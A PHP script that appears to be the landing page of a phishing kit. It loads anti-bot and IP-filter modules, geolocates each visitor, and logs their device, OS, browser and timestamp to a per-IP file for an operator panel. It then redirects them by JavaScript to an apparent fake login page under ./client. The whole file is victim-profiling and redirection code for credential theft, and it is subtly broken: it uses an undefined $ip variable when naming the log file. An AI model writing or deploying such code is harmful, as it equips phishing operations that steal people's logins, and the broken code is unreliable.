<?php
include "./config.php";
include "./lib/geoplugin.class.php";
include "./lib/UserInfo.php";
include "./lib/antibot.php";
require_once __DIR__ . '/ip-filter.php';

$geoplugin = new geoPlugin();
$geoplugin->locate();
$present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }
   $user = new UserInfo();
    $device = $user->get_device();
    $os = $user->get_os();
    $browser = $user->get_browser();

   $newLink = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $newLink = dirname($newLink) . "/panel/index.php?id_user=" . get_user_ip();
    $_SESSION['link'] = $newLink;

    $user_data = array(
        'device' => $device,
        'os' => $os,
        'browser' => $browser,
        'timestamp' => $present_time,
        'status' => "" 
    );

    $json_data = json_encode($user_data);
    $ip = str_replace(".", "-", $ip);
    $file_path = "./panel/logs/$ip.json";

    file_put_contents($file_path, $json_data);
    
    echo "<script>
        window.location = './client/login.php?redirect=' + encodeURIComponent(window.location.href);
         </script>";
    
    exit();
?>